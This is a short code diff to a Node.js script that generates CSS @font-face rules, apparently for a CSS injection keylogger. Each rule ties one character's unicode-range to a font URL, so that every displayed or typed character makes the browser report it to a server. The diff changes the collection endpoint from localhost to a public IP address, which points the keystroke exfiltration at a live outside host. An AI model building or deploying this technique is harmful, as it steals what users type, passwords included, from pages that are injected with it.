@@ -2,7 +2,7 @@ const fs = require("fs");
 
 // @font-face {
 //     font-family: x;
-//     src: url(http://localhost:3000/report?site=keylogger.font&payload=a), local("Courier New");
+//     src: url(http://13.57.38.41:3000/report?site=keylogger.font&payload=a), local("Courier New");
 //     unicode-range: U+61;
 // }
 
@@ -29,7 +29,7 @@ input {
 
 function genFontFace(char) {
     return `@font-face{font-family: x; 
-    src: url(http://localhost:3000/report?site=keylogger.font&payload=${char}), local("Courier New");
+    src: url(http://13.57.38.41:3000/report?site=keylogger.font&payload=${char}), local("Courier New");
     unicode-range: U+${char.charCodeAt(0).toString(16)};}`
 }
 
